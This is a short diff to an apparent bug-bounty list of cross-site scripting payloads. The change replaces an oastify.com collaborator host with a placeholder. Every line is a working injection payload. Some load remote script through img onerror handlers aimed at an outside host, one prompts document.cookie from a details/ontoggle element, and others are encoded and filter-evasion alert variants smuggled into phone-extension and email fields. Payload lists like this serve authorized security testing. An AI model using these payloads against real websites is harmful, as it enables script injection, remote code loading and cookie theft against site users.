@@ -1,5 +1,5 @@
-013371337;ext=<img/src/onerror=import('//xxx.oastify.com/')>
-"><img/src/onerror=import('//xxx.oastify.com/')>"@wearehackerone.com
+013371337;ext=<img/src/onerror=import('//COLLABORATOR-HERE/')>
+"><img/src/onerror=import('//COLLABORATOR-HERE/')>"@wearehackerone.com
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
 %3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%601%60%3E
 ';k='e'%0Atop['al'+k+'rt'](1)//
